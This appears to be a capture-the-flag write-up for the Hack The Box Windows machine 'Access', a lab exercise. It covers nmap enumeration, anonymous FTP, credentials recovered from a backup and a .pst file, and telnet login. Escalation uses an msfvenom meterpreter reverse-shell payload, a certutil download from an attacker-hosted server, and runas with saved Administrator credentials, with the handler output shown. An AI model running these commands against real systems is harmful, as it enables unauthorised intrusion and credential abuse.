# Access
### Info:
OS: Windows x64 <br>
IP: 10.10.10.98 <br>
Difficulty : Medium <br>
### Enumeration:

```nmap -sC -sV -oA nmap 10.10.10.98``` <br>

gives us the results : <br>

```
# Nmap 7.70 scan initiated Fri Jan 11 00:04:59 2019 as: nmap -sC -sV -oA nmap 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.36s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We trying accessing ftp with user : `anonymous` and password: ` ` which gives us access.

### Exploitation:
We see 2 folders `Backups` and `Engineer`, Backups give us the password : <b> access4u@security </b> <br> 
which is used to open zip inside Engineer folder. This leads us to a <b>.pst </b> file <br> 
which we open inside MS Outlook and we get :
```
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
Using this information we get telnet access and get the access to user: `security`

### Privilege Escaltion:
As we see port 80 is open, therefore we create a SimpleHTTPServer on our machine as :
```
python -m SimpleHTTPServer 8080 10.10.16.16
```
Now with msfvenom we create our payload as: 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=myip LPORT=4444 -f exe-only > trojan.exe
```
and keep it in same folder at our local machine. <br>
Now we download this payload on the box via:
```
certutil -urlcache -split -f http://myip:8080/trojan.exe
```
We ran the payload as `administrator` and the creds were used from default files i.e `/savedcreds`:
```
runas /user:Administrator /savedcred "trojan.exe"
```
Meanwhile we use msfconsole as:
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > set LHOST myip
LHOST => myip
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on myip:4444 
[*] Sending stage (206403 bytes) to 10.10.10.98
[*] Meterpreter session 1 opened (myip:4444 -> 10.10.10.98:49180) at 2019-01-11 20:19:17 +0530

meterpreter > shell
Process 1668 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
and the root is owned!

### Things learned:

Using local server to send files in same VPN.

Windows x64 privilege escalation.

Using Outlook for .pst files.
